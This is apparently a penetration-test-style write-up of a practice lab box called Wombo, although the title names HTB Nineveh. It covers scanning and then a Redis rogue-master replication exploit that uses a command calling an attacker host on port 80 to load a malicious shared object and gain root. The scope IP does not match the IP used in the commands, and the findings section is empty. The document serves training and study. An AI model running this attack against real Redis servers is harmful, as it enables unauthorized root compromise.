# HTB Nineveh - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-1-30

---

## 0. Lesson Learned

A hanging exploit is not a broken exploit. If an exploit connects, starts setup, and then hangs is usually means it is trying to connect and it can't. Try ports 80 and 443 before giving up.

---

## 1. Executive Summary

A penetration test was conducted against the target host *Wombo* to identify security weaknesses and assess the impact of potential exploitation. During the engagement, multiple exposed services were identified, including an unauthorized Redis instance. This misconfiguration allowed remote code execution as the root user through a Redis replication abuse technique. Full system compromise was achieved and verified by retrieval of the root proof file.

---

## 2. Scope

- **Target:** 192.169.169.69
- **Environment:** PG Practice Wombo
- **Testing Window:** 2026-1-30
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

An initial full TCP port scan was performed to identify exposed services:

```
nmap -p- -sCV 192.168.169.69 -T4 -oA wombo_initial
```

Identified open ports:

- 22/tcp - SSH - OpenSSH 7.4p1
- 80/tcp - HTTP - nginx 1.10.3
- 6379/tcp - Redis - Redis 5.0.9
- 8080/tcp - HTTP - NodeBB
- 27017/tcp - MongoDB - MongoDB 4.1.1

---

## 5. Enumeration

### HTTP (Port 80)

- Default nginx landing page
- No dynamic content or input vectors identified

### HTTP (Port 8080 - NodeBB)

- Public forum accessible
- Admin (`/admin`) and password reset (`/reset`) endpoints discovered
- No immediate unauthenticated exploit path identified

### Redis (Port 6379)

Redis was accessible without authentication, confirmed using:

```
redis-cli -h 192.168.169.69
```

This represented a critical misconfiguration and became the primary attack vector.

---

## 6. Initial Access

### Redis Exploitation Attempts

Several Redis abuse techniques were tested, including:

- Writing PHP/JSP shells to web directories
- Cron job persistence
- Reverse shell payloads

While file writes succeeded, execution was not possible via the web server.

### Redis Replication Abuse

The final successful attack used a Redis rogue master replication attack, which forces Redis to load a malicious shared object file and execute commands as root.

Initial attempts using default, high, or common ports failed due to outbound filtering. The exploit succeeded when the rogue server was hosted on port 80, a commonly allowed outbound port:

```
python redis-rce.py -r 192.168.169.69 -p 6379 -L <attacker-ip> -P 80 -f exp_lin.so
```

This resulted in immediate command execution as the root user.

---

## 7. Post-Exploitation

Upon successful exploitation, an interactive root shell was obtained. System access was fully validated, and no additional lateral movement was required.

The location of a `user.txt` flag was searched for, but returned nonexistent:

```
find / -name "user.txt"
```

---

## 8. Privilege Escalation

Not applicable.

The Redis service was running as root, and exploitation resulted directly in root-level access.

---

## 9. Proof of Compromise

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

---

## 11. Appendix

Redis Pentesting Cheatsheet -
[https://hackviser.com/tactics/pentesting/services/redis](https://hackviser.com/tactics/pentesting/services/redis)

Redis Rogue Server RCE -
[https://github.com/jas502n/Redis-RCE](https://github.com/jas502n/Redis-RCE)